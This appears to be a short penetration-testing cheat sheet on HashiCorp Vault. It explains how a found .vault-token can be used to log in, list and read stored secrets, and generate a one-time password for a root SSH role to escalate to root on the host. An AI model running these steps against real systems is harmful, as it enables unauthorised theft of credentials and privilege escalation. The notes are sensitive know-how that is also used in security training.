Vault

HashiCorp Vault is a centralized secrets management tool designed to securely store, control, and audit access to sensitive data like API keys, passwords, certificates, and encryption keys

Usage

    In case you found inside a linux operating system and you see a file called .vault-token you could be in front of an authentication token for vault

    Then check if vault is installed by using which vault and attempt to login by using... and providing the token

    vault login

    Now you can start listing secrets

    vault list secrets

    In case you would like to read a specific secret

    vault read secret/SECRET_NAME

    Check the policies is simple. In case you have root permissions you are likely to escalate to root

    vault token lookup

Gaining SSH session

    We could be able to list the roles for the SSH engine. In case you found a root user called root_otp this is your ticket to super user :)

    vault list ssh/roles

    Then generate credentials for user root

    vault write ssh/creds/root_otp username=root ip=127.0.0.1

    This will print a OTP (One Time Password) which we can provide to ssh

    ssh root@127.0.0.1

    All this process can be automated using. That way the OTP will be printed so then you provide it

    vault ssh -mode=otp -role=root_otp root@127.0.0.1
